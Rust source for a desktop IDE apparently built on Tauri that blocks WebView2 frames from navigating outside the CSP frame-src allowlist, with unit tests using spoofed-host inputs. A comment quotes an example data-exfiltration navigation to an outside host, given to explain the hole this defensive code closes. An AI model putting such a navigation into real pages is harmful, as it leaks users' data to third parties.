//! The IDE page's frames stay where its CSP lets them be (D253). `frame-src` allows frames only on
//! `http://127.0.0.1:*` (the browser pane's proxy, notebook output frames) and `http://localhost:*`
//! (extension webviews, D265: their cookies apart from previews').
//! WebKit applies that to a frame's own later navigations too, but WebView2 doesn't: a notebook
//! renderer's frame could send itself to any address (`location.href = "http://elsewhere/?data"`),
//! a way out D204 meant to close. On Windows, each frame created directly in the IDE's page gets a
//! navigation check with the same rule. Frames inside those frames (a site's own embeds in the
//! browser pane) aren't the page's CSP's business either, and aren't touched. Other platforms:
//! nothing to do.

/// Whether a frame of the IDE's page may go to `uri`: what `frame-src` allows, and `about:` (a new
/// frame's blank document, `srcdoc`).
#[cfg_attr(not(windows), allow(dead_code))]
pub fn frame_allowed(uri: &str) -> bool {
    if uri.starts_with("about:") {
        return true;
    }
    let Some(rest) = uri
        .strip_prefix("http://127.0.0.1")
        .or_else(|| uri.strip_prefix("http://localhost"))
    else {
        return false;
    };
    // The host must end there: a port, a path, or nothing (not 127.0.0.1.evil.example).
    matches!(
        rest.chars().next(),
        None | Some(':') | Some('/') | Some('?') | Some('#')
    )
}

/// Guards the frames of `window`'s page (Windows only).
pub fn guard_frames<R: tauri::Runtime>(window: &tauri::WebviewWindow<R>) {
    #[cfg(windows)]
    {
        let _ = window.with_webview(|platform| {
            // SAFETY: WebView2 COM calls on the UI thread (with_webview runs there, and so do the
            // event handlers); a failure leaves frames as WebView2 handles them.
            unsafe {
                let _ = windows_com::listen(platform);
            }
        });
    }
    #[cfg(not(windows))]
    let _ = window;
}

#[cfg(windows)]
mod windows_com {
    use webview2_com::Microsoft::Web::WebView2::Win32::{ICoreWebView2Frame2, ICoreWebView2_4};
    use webview2_com::{take_pwstr, FrameCreatedEventHandler, FrameNavigationStartingEventHandler};
    use windows::core::{Interface, PWSTR};

    pub unsafe fn listen(platform: tauri::webview::PlatformWebview) -> windows::core::Result<()> {
        let webview: ICoreWebView2_4 = platform.controller().CoreWebView2()?.cast()?;
        let mut token = 0i64;
        // FrameCreated is raised for frames directly in the page (not frames within them).
        webview.add_FrameCreated(
            &FrameCreatedEventHandler::create(Box::new(|_, args| {
                let Some(args) = args else { return Ok(()) };
                let frame: ICoreWebView2Frame2 = args.Frame()?.cast()?;
                let mut token = 0i64;
                frame.add_NavigationStarting(
                    &FrameNavigationStartingEventHandler::create(Box::new(|_, args| {
                        let Some(args) = args else { return Ok(()) };
                        let mut raw = PWSTR::null();
                        args.Uri(&mut raw)?;
                        if !super::frame_allowed(&take_pwstr(raw)) {
                            args.SetCancel(true)?;
                        }
                        Ok(())
                    })),
                    &mut token,
                )?;
                Ok(())
            })),
            &mut token,
        )?;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::frame_allowed;

    #[test]
    fn frames_keep_to_the_csp_frame_src() {
        assert!(frame_allowed("http://127.0.0.1:61716/cross.html"));
        assert!(frame_allowed("http://127.0.0.1/"));
        assert!(frame_allowed("about:blank"));
        assert!(frame_allowed("about:srcdoc"));
        // Extension webviews (D265).
        assert!(frame_allowed("http://localhost:61716/index.html"));
        assert!(!frame_allowed("http://localhost.evil.example/"));
        assert!(!frame_allowed("http://127.0.0.1.evil.example/"));
        assert!(!frame_allowed("https://127.0.0.1:3000/"));
        assert!(!frame_allowed("https://example.com/"));
        assert!(!frame_allowed("data:text/html,hi"));
    }
}
